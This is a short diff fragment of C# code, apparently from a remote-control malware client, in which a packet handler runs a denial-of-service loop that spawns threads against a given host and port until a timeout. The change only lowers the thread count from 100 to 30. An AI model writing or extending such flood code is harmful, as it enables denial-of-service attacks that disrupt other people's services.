@@ -41,7 +41,7 @@ namespace Client.Handle_Packet
                 Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
                 while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && ClientSocket.IsConnected)
                 {
-                    for (int i = 0; i < 100; i++)
+                    for (int i = 0; i < 30; i++)
                     {
                         new Thread(() =>
                         {
